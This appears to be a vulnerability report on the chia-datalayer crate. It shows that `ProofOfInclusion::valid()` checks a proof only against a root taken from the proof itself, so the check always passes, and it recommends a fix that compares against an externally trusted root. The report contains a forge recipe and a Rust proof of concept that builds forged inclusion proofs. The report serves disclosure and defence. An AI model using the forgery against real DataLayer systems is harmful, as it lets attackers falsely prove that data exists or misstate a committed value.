### Title
`ProofOfInclusion::valid()` Performs Self-Referential Root Check, Allowing Forged DataLayer Inclusion Proofs - (File: `crates/chia-datalayer/src/merkle/proof_of_inclusion.rs`)

### Summary
`ProofOfInclusion::valid()` in the DataLayer crate verifies internal chain consistency but compares the final accumulated hash against `self.root_hash()`, which is itself derived from the last layer's `combined_hash` — the same value just computed in the loop. The final equality check is a tautology: it is always `true` whenever the loop completes without returning `false`. No external trusted root is ever consulted. An unprivileged attacker who can supply a `ProofOfInclusion` object (via the Python or Streamable deserialization boundary) can forge a proof for any arbitrary `node_hash` and have `valid()` return `true`.

### Finding Description

`ProofOfInclusion::valid()` is defined as:

```rust
pub fn valid(&self) -> bool {
    let mut existing_hash = self.node_hash;

    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );

        if calculated_hash != layer.combined_hash {
            return false;
        }

        existing_hash = calculated_hash;  // existing_hash := layer.combined_hash
    }

    existing_hash == self.root_hash()     // ← always true
}
```

`root_hash()` is:

```rust
pub fn root_hash(&self) -> Hash {
    if let Some(last) = self.layers.last() {
        last.combined_hash   // ← same value existing_hash was just set to
    } else {
        self.node_hash
    }
}
```

After the loop, `existing_hash` holds the last `calculated_hash`, which was already asserted equal to `layer.combined_hash` by the `if` guard. `root_hash()` returns that same `last.combined_hash`. Therefore `existing_hash == self.root_hash()` is unconditionally `true` whenever the loop exits normally. The function never compares against any externally-supplied or independently-trusted tree root.

**Forge recipe (no cryptographic break required):**
1. Choose any target `node_hash` (the leaf hash the attacker wants to claim is in the tree).
2. For each desired layer, pick arbitrary `other_hash` and `other_hash_side`.
3. Compute `combined_hash = calculate_internal_hash(prev_hash, other_hash_side, other_hash)`.
4. Assemble a `ProofOfInclusion { node_hash, layers }`.
5. `proof.valid()` returns `true`; `proof.root_hash()` returns the attacker-chosen final hash.

The struct is fully deserializable from bytes via the `Streamable` derive and is exposed to Python via `pyclass(get_all, from_py_object)` and `py_valid()`, making the attack surface reachable from any untrusted serialized input.

### Impact Explanation

Any Python or Rust consumer that calls `proof.valid()` as the sole gate for DataLayer inclusion — without separately checking `proof.root_hash()` against a known-good tree root — will accept forged proofs for arbitrary key-value pairs. This lets an attacker prove that data exists in a DataLayer store when it does not, or prove a different value for a key than what is actually committed. This directly matches the allowed High impact: "DataLayer Merkle proof/blob/delta logic accepts forged inclusion/exclusion … or lets untrusted input prove invalid state."

### Likelihood Explanation

The Python binding exposes `ProofOfInclusion` as a first-class deserializable type with `from_bytes`, `from_bytes_unchecked`, and `parse_rust` constructors, and exposes `valid()` and `root_hash()` as separate methods. The API design strongly implies that `valid()` is the complete verification step. Any downstream code that follows this natural usage pattern is vulnerable. The forge requires only arithmetic over the hash function — no key material, no privileged access.

### Recommendation

`valid()` must accept an externally-trusted root hash and compare against it instead of `self.root_hash()`:

```rust
pub fn valid_against_root(&self, trusted_root: &Hash) -> bool {
    let mut existing_hash = self.node_hash;
    for layer in &self.layers {
        let calculated_hash = crate::calculate_internal_hash(
            &existing_hash,
            layer.other_hash_side,
            &layer.other_hash,
        );
        if calculated_hash != layer.combined_hash {
            return false;
        }
        existing_hash = calculated_hash;
    }
    &existing_hash == trusted_root   // compare against external authority
}
```

The existing `valid()` (and its Python binding `py_valid()`) should either be removed or deprecated with a clear warning that it does not verify against any real tree root. The fuzz target in `crates/chia-datalayer/fuzz/fuzz_targets/proofs_of_inclusion.rs` should be updated to assert that forged proofs are rejected.

### Proof of Concept

```rust
use chia_datalayer::{Hash, Side};
use chia_datalayer::merkle::proof_of_inclusion::{ProofOfInclusion, ProofOfInclusionLayer};

fn forge_proof(target_node_hash: Hash, fake_sibling: Hash) -> ProofOfInclusion {
    // calculate_internal_hash(target_node_hash, Left, fake_sibling) → combined
    let combined = chia_datalayer::calculate_internal_hash(
        &target_node_hash, Side::Left, &fake_sibling
    );
    ProofOfInclusion {
        node_hash: target_node_hash,
        layers: vec![ProofOfInclusionLayer {
            other_hash_side: Side::Left,
            other_hash: fake_sibling,
            combined_hash: combined,   // attacker sets this to match
        }],
    }
}

fn main() {
    let arbitrary_target = [0xABu8; 32];
    let junk_sibling     = [0x11u8; 32];
    let proof = forge_proof(arbitrary_target, junk_sibling);
    assert!(proof.valid());   // passes — no real tree involved
    // proof.root_hash() returns the attacker-controlled combined hash
}
